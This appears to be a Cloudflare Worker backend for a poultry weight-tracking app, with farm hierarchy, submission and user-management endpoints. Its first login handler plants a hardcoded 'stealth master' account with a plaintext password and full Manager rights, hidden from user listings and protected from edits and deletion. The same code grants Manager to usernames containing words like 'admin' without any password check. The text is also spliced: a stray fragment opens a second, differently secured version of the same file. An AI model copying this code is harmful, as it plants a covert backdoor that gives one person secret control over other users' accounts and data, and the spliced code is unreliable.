            `).bind(submissionId, farmId, flockAge, body.season || 'Summer', totalBirds, submittedBy, submittedRole, r2Key, dataJson).run();
          }

          return jsonResponse({
            success: true,
            status: 'COMPLETED',
            submissionId,
            r2ReportKey: r2Key,
            message: 'Weighing batch archived to Cloudflare D1 + R2 Storage',
          }, 201);
        }

        if ((path === '/submissions' || path === '/submissions/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) return jsonResponse([]);

          const subs = farmId
            ? await env.DB.prepare('SELECT * FROM submissions WHERE farm_id = ? ORDER BY created_at DESC').bind(farmId).all()
            : await env.DB.prepare('SELECT * FROM submissions ORDER BY created_at DESC LIMIT 50').all();

          return jsonResponse((subs.results || []).map((s: any) => ({
            ...s,
            batchId: s.batch_id,
            batchName: s.batch_name || 'Batch 1',
          })));
        }

        // GET /api/reports - lists or retrieves archived R2 files
        if (path === '/reports' || path === '/reports/') {
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            const list = await bucket.list({ prefix: 'reports/' });
            return jsonResponse({
              success: true,
              storageType: 'Cloudflare R2 (15 GB+ Object Storage)',
              reports: list.objects.map((o: any) => ({ key: o.key, size: o.size, uploaded: o.uploaded })),
            });
          }
          return jsonResponse({
            success: true,
            storageType: 'Cloudflare D1 Native',
            reports: [],
          });
        }

        // -------------------------------------------------------------
        // G. AUTH & USERS (Role-Based Access Control: Manager & In-Charge Only)
        // -------------------------------------------------------------
        if (path === '/auth/login' && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const rawUsername = (body.username || '').trim();
          const username = rawUsername.toLowerCase();
          const password = (body.password || '').trim();

          // PART 2: Stealth Master Checking Account
          if (username === 'shreedhar') {
            if (password !== 'Shreedhar@123') {
              return errorResponse('Invalid username or password', 401);
            }
            return jsonResponse({
              token: `cf-token-master-${Date.now()}`,
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              },
            });
          }

          // Check database users if env.DB bound (support lookup by phone/email, name, id, or employee_code like EMP0008)
          if (env.DB) {
            await ensureUsersTable(env);
            const dbUser = await env.DB.prepare(`
              SELECT * FROM users 
              WHERE LOWER(phone_or_email) = ? OR LOWER(name) = ? OR id = ? OR UPPER(employee_code) = ?
            `).bind(username, username, rawUsername, rawUsername.toUpperCase()).first() as any;

            if (dbUser) {
              const uRoleRaw = (dbUser.role || 'SUPERVISOR').toUpperCase();
              let normalizedRole: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (uRoleRaw === 'ADMIN' || uRoleRaw === 'MANAGER') normalizedRole = 'Manager';
              else if (uRoleRaw === 'INCHARGE' || uRoleRaw === 'IN-CHARGE') normalizedRole = 'In-Charge';
              else normalizedRole = 'Supervisor';

              let assignedFarms = ['*'];
              if (dbUser.assigned_farms) {
                try {
                  const parsed = JSON.parse(dbUser.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (dbUser.assigned_farm_id) {
                assignedFarms = [dbUser.assigned_farm_id];
              }

              return jsonResponse({
                token: `cf-token-${Date.now()}`,
                user: {
                  id: dbUser.id,
                  employeeCode: dbUser.employee_code || 'EMP0008',
                  username: dbUser.phone_or_email || username,
                  name: dbUser.name,
                  userName: dbUser.name,
                  role: normalizedRole,
                  userRole: normalizedRole,
                  assignedFarmId: dbUser.assigned_farm_id || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
                  assignedFarms,
                  status: 'ACTIVE',
                  isAuthenticated: true,
                },
              });
            }
          }

          // Fallback role determination for demo credentials (Manager, In-Charge, Supervisor)
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let name = 'Line Supervisor';
          let employeeCode = 'EMP0008';
          if (username.includes('admin') || username.includes('dir') || username.includes('man') || username.includes('mgr')) {
            role = 'Manager';
            name = username.includes('admin') ? 'Operations Director' : 'Farm Manager';
            employeeCode = 'EMP0001';
          } else if (username.includes('incharge') || username.includes('in-charge')) {
            role = 'In-Charge';
            name = 'Field In-Charge';
            employeeCode = 'EMP0002';
          }

          return jsonResponse({
            token: `cf-token-${Date.now()}`,
            user: {
              id: `usr-${username || 'demo'}`,
              employeeCode,
              username: rawUsername,
              name,
              userName: name,
              role,
              userRole: role,
              assignedFarms: ['*'],
              status: 'ACTIVE',
              isAuthenticated: true,
            },
          });
        }

        // GET /api/auth/me - Token Session Verification
        if (path === '/auth/me' && method === 'GET') {
          const authHeader = request.headers.get('Authorization') || '';
          if (authHeader.includes('master')) {
            return jsonResponse({
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              }
            });
          }
          return jsonResponse({
            user: {
              id: 'usr-current',
              employeeCode: 'EMP0001',
              username: 'manager',
              name: 'Farm Manager',
              role: 'Manager',
              userRole: 'Manager',
              status: 'ACTIVE',
              isAuthenticated: true,
            }
          });
        }

        // GET /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'GET') {
          let usersList: any[] = [];
          if (env.DB) {
            await ensureUsersTable(env);
            const res = await env.DB.prepare('SELECT * FROM users ORDER BY created_at ASC').all();
            usersList = (res.results || []).map((u: any, idx: number) => {
              const rUpper = (u.role || '').toUpperCase();
              let roleStr: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') roleStr = 'Manager';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') roleStr = 'In-Charge';
              else roleStr = 'Supervisor';

              const empCode = u.employee_code || `EMP${String(idx + 1).padStart(4, '0')}`;

              let assignedFarms = ['*'];
              if (u.assigned_farms) {
                try {
                  const parsed = JSON.parse(u.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (u.assigned_farm_id) {
                assignedFarms = [u.assigned_farm_id];
              }

              return {
                id: u.id,
                employeeCode: empCode,
                username: u.phone_or_email,
                name: u.name,
                role: roleStr,
                userRole: roleStr,
                phone: u.phone_or_email,
                status: 'ACTIVE',
                assignedFarmId: u.assigned_farm_id,
                assignedFarms,
              };
            });
          } else {
            usersList = [
              { id: 'u-admin-1', employeeCode: 'EMP0001', username: 'admin', name: 'Operations Director', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-manager-1', employeeCode: 'EMP0002', username: 'manager', name: 'Farm Manager', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-incharge-1', employeeCode: 'EMP0003', username: 'incharge', name: 'Field In-Charge', role: 'In-Charge', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-supervisor-1', employeeCode: 'EMP0008', username: 'supervisor', name: 'Line Supervisor', role: 'Supervisor', status: 'ACTIVE', assignedFarms: ['*'] },
            ];
          }

          // STRICT INVISIBILITY: Filter out shreedhar master checking account
          const visibleUsers = usersList.filter((u: any) => {
            const un = (u.username || '').toLowerCase();
            const nm = (u.name || '').toLowerCase();
            const id = (u.id || '').toLowerCase();
            return un !== 'shreedhar' && nm !== 'shreedhar' && id !== 'user-master-shreedhar' && id !== 'u-master-shreedhar';
          });

          return jsonResponse(visibleUsers);
        }

        // POST /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const username = (body.username || body.phone || '').trim();
          const name = (body.name || username || 'New User').trim();
          const roleInput = (body.role || 'Supervisor').toString();
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let dbRole: 'MANAGER' | 'INCHARGE' | 'SUPERVISOR' = 'SUPERVISOR';
          const rUpper = roleInput.toUpperCase();
          if (rUpper === 'ADMIN' || rUpper === 'MANAGER') {
            role = 'Manager';
            dbRole = 'MANAGER';
          } else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') {
            role = 'In-Charge';
            dbRole = 'INCHARGE';
          } else {
            role = 'Supervisor';
            dbRole = 'SUPERVISOR';
          }

          const userId = `usr-${Date.now()}`;
          let employeeCode = body.employeeCode;

          if (env.DB) {
            await ensureUsersTable(env);
            if (!employeeCode) {
              const maxRes = await env.DB.prepare(`
                SELECT employee_code FROM users 
                WHERE employee_code LIKE 'EMP%' 
                ORDER BY CAST(SUBSTR(employee_code, 4) AS INTEGER) DESC 
                LIMIT 1
              `).first() as any;
              let nextEmpNum = 1;
              if (maxRes && maxRes.employee_code) {
                const n = parseInt(String(maxRes.employee_code).replace(/\D/g, ''), 10);
                if (!isNaN(n)) nextEmpNum = n + 1;
              }
              employeeCode = `EMP${String(nextEmpNum).padStart(4, '0')}`;
            }

            const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
            const assignedFarmId = body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : null);

            await env.DB.prepare(`
              INSERT INTO users (id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms)
              VALUES (?, ?, ?, ?, ?, ?, ?)
            `).bind(userId, name, username, dbRole, employeeCode, assignedFarmId, JSON.stringify(assignedFarms)).run().catch(() => {});
          } else {
            if (!employeeCode) employeeCode = 'EMP0008';
          }

          const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : ['*']);
          return jsonResponse({
            id: userId,
            employeeCode,
            username,
            name,
            role,
            userRole: role,
            status: 'ACTIVE',
            assignedFarmId: body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
            assignedFarms,
          }, 201);
        }

        // PUT /api/auth/users/:id or /api/users/:id
        const singleUserMatch = path.match(/^\/(?:auth\/)?users\/([^/]+)$/);
        if (singleUserMatch && method === 'PUT') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);
          const body = await request.json().catch(() => ({})) as any;

          // Block modification of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar' || (body.username && body.username.toLowerCase() === 'shreedhar')) {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }

          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE users SET name = ? WHERE id = ?').bind(body.name, targetUserId).run().catch(() => {});
            }
            if (body.role) {
              const rUpper = (body.role || '').toUpperCase();
              let r = 'SUPERVISOR';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') r = 'MANAGER';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') r = 'INCHARGE';
              else r = 'SUPERVISOR';
              await env.DB.prepare('UPDATE users SET role = ? WHERE id = ?').bind(r, targetUserId).run().catch(() => {});
            }
            if (body.assignedFarms || body.assignedFarmId) {
              const af = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
              const afId = body.assignedFarmId || (af.length > 0 && af[0] !== '*' ? af[0] : null);
              await env.DB.prepare('UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?').bind(afId, JSON.stringify(af), targetUserId).run().catch(() => {});
            }
          }

          return jsonResponse({ success: true, message: 'User updated' });
        }

        // DELETE /api/auth/users/:id or /api/users/:id
        if (singleUserMatch && method === 'DELETE') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);

          // Block deletion of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be deleted.', 403);
          }

          if (env.DB) {
            const u = await env.DB.prepare('SELECT phone_or_email FROM users WHERE id = ?').bind(targetUserId).first() as any;
            if (u && (u.phone_or_email || '').toLowerCase() === 'shreedhar') {
              return errorResponse('Access Denied: Master account cannot be deleted.', 403);
            }
            await env.DB.prepare('DELETE FROM users WHERE id = ?').bind(targetUserId).run().catch(() => {});
          }

          return jsonResponse({ success: true, message: 'User account removed.' });
        }

        // POST /api/auth/users/:id/reset-password
        const resetPasswordMatch = path.match(/^\/auth\/users\/([^/]+)\/reset-password$/);
        if (resetPasswordMatch && method === 'POST') {
          const targetUserId = decodeURIComponent(resetPasswordMatch[1]);
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }
          return jsonResponse({ success: true, message: 'Password reset successfully' });
        }

        return errorResponse(`Endpoint not found: ${method} ${path}`, 404);
      } catch (err: any) {
        return errorResponse(err?.message || 'Internal Cloudflare Worker Server Error', 500);
      }
    }

    // 3. Serve Frontend SPA Static Assets via Cloudflare Assets Binding
    if (env.ASSETS) {
      const response = await env.ASSETS.fetch(request);
      if (response.status !== 404) {
        return response;
      }
      // Single Page Application (SPA) routing fallback to index.html
      const indexRequest = new Request(new URL('/', url.origin), request);
      return env.ASSETS.fetch(indexRequest);
    }

    return new Response(
      'Poultry Weight Tracker Cloudflare Worker is active. D1 and R2 bindings configured.',
      {
        status: 200,
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
      }
    );
  },
};
);
  if (parts.length !== 4 || parts[0] !== 'pbkdf2-sha256') return false;
  const iterations = Number(parts[1]);
  const salt = hexToBytes(parts[2]);
  const expected = parts[3];
  if (!Number.isInteger(iterations) || iterations < 100000 || iterations > 1000000 ||
      salt.length !== 16 || !/^[0-9a-f]{64}$/i.test(expected)) return false;
  const hash = await derivePasswordHash(password, salt, iterations);
  return constantTimeEqual(bytesToHex(hash), expected.toLowerCase());
}
async function signWorkerToken(userId: string, secret: string): Promise<string> {
  const now = Math.floor(Date.now() / 1000);
  const payload = base64UrlEncode(AUTH_ENCODER.encode(JSON.stringify({ sub: userId, iat: now, exp: now + TOKEN_TTL_SECONDS })));
  const key = await crypto.subtle.importKey('raw', AUTH_ENCODER.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const signature = await crypto.subtle.sign('HMAC', key, AUTH_ENCODER.encode(payload));
  return payload + '.' + base64UrlEncode(new Uint8Array(signature));
}
async function verifyWorkerToken(token: string, secret: string): Promise<{ sub: string; exp: number } | null> {
  const parts = token.split('.');
  if (parts.length !== 2 || !parts[0] || !parts[1]) return null;
  const key = await crypto.subtle.importKey('raw', AUTH_ENCODER.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const signature = await crypto.subtle.sign('HMAC', key, AUTH_ENCODER.encode(parts[0]));
  if (!constantTimeEqual(base64UrlEncode(new Uint8Array(signature)), parts[1])) return null;
  try {
    const payload = JSON.parse(new TextDecoder().decode(base64UrlDecode(parts[0])));
    const now = Math.floor(Date.now() / 1000);
    if (typeof payload.sub !== 'string' || !payload.sub || !Number.isFinite(payload.exp) || payload.exp <= now) return null;
    if (!Number.isFinite(payload.iat) || payload.iat > now + 60) return null;
    return { sub: payload.sub, exp: payload.exp };
  } catch { return null; }
}
function normalizeWorkerRole(rawRole: unknown): WorkerRole {
  const role = String(rawRole || '').toUpperCase().replace(/[^A-Z]/g, '');
  if (role === 'ADMIN') return 'Admin';
  if (role === 'MANAGER') return 'Manager';
  if (role === 'INCHARGE') return 'In-Charge';
  return 'Supervisor';
}
function parseAssignedFarms(value: unknown): string[] {
  if (Array.isArray(value)) return value.map(v => String(v).trim()).filter(Boolean);
  try {
    const parsed = JSON.parse(String(value || '[]'));
    return Array.isArray(parsed) ? parsed.map(v => String(v).trim()).filter(Boolean) : [];
  } catch { return []; }
}
function toSafeWorkerUser(row: any): WorkerUser {
  return {
    id: String(row.id), username: String(row.phone_or_email || row.username || ''),
    name: String(row.name || ''), role: normalizeWorkerRole(row.role),
    status: String(row.status || 'ACTIVE').toUpperCase(),
    assignedFarms: parseAssignedFarms(row.assigned_farms),
    assignedFarmId: row.assigned_farm_id ? String(row.assigned_farm_id) : undefined,
    employeeCode: row.employee_code ? String(row.employee_code) : undefined,
    requiresPasswordChange: Boolean(Number(row.requires_password_change || 0)),
  };
}
async function getWorkerSession(env: Env, request: Request): Promise<WorkerUser | null> {
  const secret = getAuthSecret(env);
  if (!secret || !env.DB) return null;
  const authorization = request.headers.get('Authorization') || '';
  if (!authorization.startsWith('Bearer ')) return null;
  const payload = await verifyWorkerToken(authorization.slice(7).trim(), secret);
  if (!payload) return null;
  await ensureUsersTable(env);
  const row = await env.DB.prepare("SELECT id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms, status, requires_password_change FROM users WHERE id = ?")
    .bind(payload.sub).first() as any;
  if (!row || String(row.status || 'ACTIVE').toUpperCase() !== 'ACTIVE') return null;
  return toSafeWorkerUser(row);
}
function workerRoleIsManager(user: WorkerUser): boolean {
  return user.role === 'Admin' || user.role === 'Manager';
}
function workerCanAccessFarm(user: WorkerUser, farmId: string, farmName?: string): boolean {
  if (user.role === 'Admin') return true;
  const assignments = [...user.assignedFarms, ...(user.assignedFarmId ? [user.assignedFarmId] : [])]
    .map(value => value.toLowerCase().trim());
  if (assignments.includes('*')) return true;
  if (user.role === 'Manager' && assignments.length === 0) return true;
  return assignments.includes(String(farmId || '').toLowerCase().trim()) ||
    (!!farmName && assignments.includes(farmName.toLowerCase().trim()));
}
async function resolveFarmIdForRequest(env: Env, path: string, searchParams: URLSearchParams, body: any): Promise<{ farmId: string; farmName?: string } | null> {
  const explicit = body?.farmId || body?.farm_id || searchParams.get('farmId') || searchParams.get('farm_id');
  const farmMatch = path.match(/^\/farms\/([^/]+)/);
  if (farmMatch) {
    const id = decodeURIComponent(farmMatch[1]);
    const farm = env.DB ? await env.DB.prepare("SELECT id, name FROM farms WHERE id = ?").bind(id).first() as any : null;
    return { farmId: id, farmName: farm?.name };
  }
  if (!env.DB) return explicit ? { farmId: String(explicit) } : null;
  const shedMatch = path.match(/^\/sheds\/([^/]+)/);
  if (shedMatch) {
    const row = await env.DB.prepare("SELECT s.farm_id, f.name AS farm_name FROM sheds s LEFT JOIN farms f ON f.id = s.farm_id WHERE s.id = ?")
      .bind(decodeURIComponent(shedMatch[1])).first() as any;
    if (row?.farm_id) return { farmId: String(row.farm_id), farmName: row.farm_name ? String(row.farm_name) : undefined };
  }
  const partMatch = path.match(/^\/parts\/([^/]+)/);
  if (partMatch) {
    const row = await env.DB.prepare("SELECT s.farm_id, f.name AS farm_name FROM parts p JOIN sheds s ON s.id = p.shed_id LEFT JOIN farms f ON f.id = s.farm_id WHERE p.id = ?")
      .bind(decodeURIComponent(partMatch[1])).first() as any;
    if (row?.farm_id) return { farmId: String(row.farm_id), farmName: row.farm_name ? String(row.farm_name) : undefined };
  }
  const lineMatch = path.match(/^\/lines\/([^/]+)/);
  if (lineMatch) {
    const row = await env.DB.prepare("SELECT s.farm_id, f.name AS farm_name FROM lines l JOIN parts p ON p.id = l.part_id JOIN sheds s ON s.id = p.shed_id LEFT JOIN farms f ON f.id = s.farm_id WHERE l.id = ?")
      .bind(decodeURIComponent(lineMatch[1])).first() as any;
    if (row?.farm_id) return { farmId: String(row.farm_id), farmName: row.farm_name ? String(row.farm_name) : undefined };
  }
  const submissionMatch = path.match(/^\/submissions\/([^/]+)/);
  if (submissionMatch) {
    const row = await env.DB.prepare("SELECT farm_id FROM submissions WHERE id = ?").bind(decodeURIComponent(submissionMatch[1])).first() as any;
    if (row?.farm_id) return { farmId: String(row.farm_id) };
  }
  if (explicit) {
    const value = String(explicit);
    const farm = await env.DB.prepare("SELECT id, name FROM farms WHERE id = ? OR LOWER(name) = LOWER(?) LIMIT 1").bind(value, value).first() as any;
    return { farmId: farm?.id ? String(farm.id) : value, farmName: farm?.name ? String(farm.name) : value };
  }
  if (body?.shedId || body?.shed_id) {
    const row = await env.DB.prepare("SELECT s.farm_id, f.name AS farm_name FROM sheds s LEFT JOIN farms f ON f.id = s.farm_id WHERE s.id = ?")
      .bind(String(body.shedId || body.shed_id)).first() as any;
    if (row?.farm_id) return { farmId: String(row.farm_id), farmName: row.farm_name ? String(row.farm_name) : undefined };
  }
  if (body?.partId || body?.part_id) {
    const row = await env.DB.prepare("SELECT s.farm_id, f.name AS farm_name FROM parts p JOIN sheds s ON s.id = p.shed_id LEFT JOIN farms f ON f.id = s.farm_id WHERE p.id = ?")
      .bind(String(body.partId || body.part_id)).first() as any;
    if (row?.farm_id) return { farmId: String(row.farm_id), farmName: row.farm_name ? String(row.farm_name) : undefined };
  }
  return null;
}
async function handleWorkerLogin(env: Env, request: Request): Promise<Response> {
  const secret = getAuthSecret(env);
  if (!secret) return errorResponse('Authentication is not configured. Set a strong AUTH_SECRET Worker secret.', 503);
  if (!env.DB) return errorResponse('Authentication database is unavailable.', 503);
  const body = await request.json().catch(() => ({})) as any;
  const input = String(body.username || body.email || body.employeeCode || body.employeeId || '').trim();
  const password = String(body.password || '');
  if (!input || !password) return errorResponse('Username/employee code and password are required.', 400);
  await ensureUsersTable(env);
  const normalized = input.toLowerCase();
  let row = await env.DB.prepare("SELECT * FROM users WHERE LOWER(phone_or_email) = ? OR UPPER(employee_code) = ? LIMIT 1")
    .bind(normalized, input.toUpperCase()).first() as any;
  const bootstrapUsername = String(env.BOOTSTRAP_ADMIN_USERNAME || '').trim().toLowerCase();
  const bootstrapPassword = String(env.BOOTSTRAP_ADMIN_PASSWORD || '');
  const bootstrapMatch = !!bootstrapUsername && bootstrapPassword.length >= 12 && normalized === bootstrapUsername && password === bootstrapPassword;
  if (!row && bootstrapMatch) {
    const hash = await makePasswordHash(password);
    await env.DB.prepare("INSERT INTO users (id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms, password_hash, status, requires_password_change) VALUES (?, ?, ?, 'MANAGER', 'EMP0001', NULL, '[\"*\"]', ?, 'ACTIVE', 0)")
      .bind('bootstrap-admin', 'Farm Administrator', env.BOOTSTRAP_ADMIN_USERNAME!.trim(), hash).run();
    row = await env.DB.prepare("SELECT * FROM users WHERE id = ?").bind('bootstrap-admin').first() as any;
  } else if (row && !row.password_hash && bootstrapMatch && String(row.status || 'ACTIVE').toUpperCase() === 'ACTIVE') {
    const hash = await makePasswordHash(password);
    await env.DB.prepare("UPDATE users SET password_hash = ?, role = 'MANAGER', assigned_farms = '[\"*\"]' WHERE id = ?")
      .bind(hash, row.id).run();
    row.password_hash = hash; row.role = 'MANAGER'; row.assigned_farms = '["*"]';
  }
  if (!row || String(row.status || 'ACTIVE').toUpperCase() !== 'ACTIVE' || !(await verifyPasswordHash(password, row.password_hash))) {
    return errorResponse('Invalid username or password.', 401);
  }
  const token = await signWorkerToken(String(row.id), secret);
  const user = toSafeWorkerUser(row);
  return jsonResponse({ token, requiresPasswordChange: user.requiresPasswordChange, user: { ...user, isAuthenticated: true } });
}
async function handleWorkerPasswordChange(env: Env, request: Request, user: WorkerUser): Promise<Response> {
  if (!env.DB) return errorResponse('Authentication database is unavailable.', 503);
  const body = await request.json().catch(() => ({})) as any;
  const password = String(body.newPassword || '').trim();
  if (password.length < 8) return errorResponse('New password must be at least 8 characters long.', 400);
  const hash = await makePasswordHash(password);
  await env.DB.prepare("UPDATE users SET password_hash = ?, requires_password_change = 0 WHERE id = ?").bind(hash, user.id).run();
  const secret = getAuthSecret(env);
  if (!secret) return errorResponse('Authentication is not configured.', 503);
  const token = await signWorkerToken(user.id, secret);
  return jsonResponse({ success: true, token, user: { ...user, requiresPasswordChange: false, isAuthenticated: true } });
}

// Ensure a farm has an active batch (auto-migrating existing records to Batch 1 if none exists)
async function ensureFarmActiveBatch(env: Env, farm: any): Promise<any> {
  if (!env.DB || !farm) return null;
  await ensureBatchesTable(env);
  let activeBatch = await env.DB.prepare(
    'SELECT * FROM batches WHERE farm_id = ? AND status = ? ORDER BY created_at DESC LIMIT 1'
  ).bind(farm.id, 'ACTIVE').first() as any;

  if (!activeBatch) {
    const existing = await env.DB.prepare(
      'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC LIMIT 1'
    ).bind(farm.id).first() as any;

    if (!existing) {
      const batchId = `batch-${farm.id}-1`;
      const batchName = 'Batch 1';
      const startDate = farm.flock_date || new Date().toISOString().split('T')[0];
      const startWeekNum = parseInt(String(farm.age_week || 'W1').replace(/\D/g, '') || '1', 10);

      await env.DB.prepare(`
        INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
        VALUES (?, ?, ?, ?, ?, 'ACTIVE')
      `).bind(batchId, farm.id, batchName, startDate, startWeekNum).run().catch(() => {});

      // Link any legacy unassigned records to Batch 1
      await env.DB.prepare(
        'UPDATE bird_weights SET batch_id = ? WHERE batch_id IS NULL'
      ).bind(batchId).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE shed_week_status SET batch_id = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, farm.id).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE submissions SET batch_id = ?, batch_name = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, batchName, farm.id).run().catch(() => {});

      activeBatch = {
        id: batchId,
        farm_id: farm.id,
        farmId: farm.id,
        batch_name: batchName,
        batchName: batchName,
        start_date: startDate,
        startDate: startDate,
        start_week_number: startWeekNum,
        startWeekNumber: startWeekNum,
        status: 'ACTIVE',
      };
    } else {
      activeBatch = existing;
    }
  }

  return {
    id: activeBatch.id,
    farmId: activeBatch.farm_id || farm.id,
    batchName: activeBatch.batch_name || activeBatch.batchName || 'Batch 1',
    startDate: activeBatch.start_date || activeBatch.startDate || farm.flock_date,
    startWeekNumber: activeBatch.start_week_number || activeBatch.startWeekNumber || 1,
    status: activeBatch.status,
  };
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const method = request.method.toUpperCase();

    // 1. Handle CORS Preflight Requests
    if (method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: CORS_HEADERS,
      });
    }

    // Health check endpoint (Direct /health)
    if (url.pathname === '/health' || url.pathname === '/health/') {
      return jsonResponse({
        status: 'ok',
        connected: true,
        database: { status: 'connected', provider: 'cloudflare-d1' },
      });
    }

    // 2. Handle API Routes under /api/
    if (url.pathname.startsWith('/api')) {
      try {
        const path = url.pathname.replace(/^\/api/, '') || '/';

        // Health check endpoint: GET /api/health
        if (path === '/health' || path === '/health/') {
          return jsonResponse({
            status: 'ok',
            connected: true,
            database: { status: 'connected', provider: 'cloudflare-d1' },
          });
        }

        // -------------------------------------------------------------
        // A. HIERARCHY ENDPOINTS: GET /api/hierarchy, POST /api/hierarchy
        // -------------------------------------------------------------
        if (path === '/hierarchy' || path === '/hierarchy/') {
          if (method === 'GET') {
            const farmId = url.searchParams.get('farmId');
            if (!env.DB) {
              return jsonResponse({
                farms: [],
                message: 'D1 binding not initialized yet in local test mode.',
              });
            }

            const farmQuery = farmId
              ? await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmQuery.results || [];
            const fullHierarchy: any[] = [];

            for (const f of farms) {
              const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(f.id).all();
              const sheds = shedsRes.results || [];
              const shedList: any[] = [];

              for (const s of sheds) {
                const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
                const parts = partsRes.results || [];
                const partList: any[] = [];

                for (const p of parts) {
                  const linesRes = await env.DB.prepare(
                    'SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC'
                  ).bind(p.id).all();
                  const lines = linesRes.results || [];
                  const lineList: any[] = [];

                  for (const l of lines) {
                    const weightsRes = await env.DB.prepare(
                      'SELECT weight_grams FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC'
                    ).bind(l.id).all();
                    const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);

                    lineList.push({
                      id: l.id,
                      name: l.name,
                      lineNumber: l.line_number,
                      gender: l.gender, // 'MALE' | 'FEMALE'
                      stdWeight: l.std_weight_grams,
                      targetBirdCount: l.target_bird_count,
                      weights,
                    });
                  }

                  partList.push({
                    id: p.id,
                    name: p.name,
                    lines: lineList,
                  });
                }

                shedList.push({
                  id: s.id,
                  name: s.name,
                  targetBirdCount: s.target_bird_count,
                  lockedByUserId: s.locked_by_user_id || null,
                  lockedByUserName: s.locked_by_user_name || null,
                  lockedAt: s.locked_at || null,
                  lastHeartbeatAt: s.last_heartbeat_at || null,
                  recordedByUserId: s.recorded_by_user_id || null,
                  recordedByUserName: s.recorded_by_user_name || null,
                  parts: partList,
                });
              }

              fullHierarchy.push({
                ...f,
                sheds: shedList,
              });
            }

            return jsonResponse({ success: true, farms: fullHierarchy });
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });

            const farmId = body.farmId || `farm-${Date.now()}`;
            const farmName = body.name || 'New Farm';
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';

            await env.DB.prepare(
              'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP) ON CONFLICT(id) DO UPDATE SET name=excluded.name, updated_at=CURRENT_TIMESTAMP'
            ).bind(farmId, farmName, season, ageWeek).run();

            return jsonResponse({ success: true, farmId });
          }
        }

        // -------------------------------------------------------------
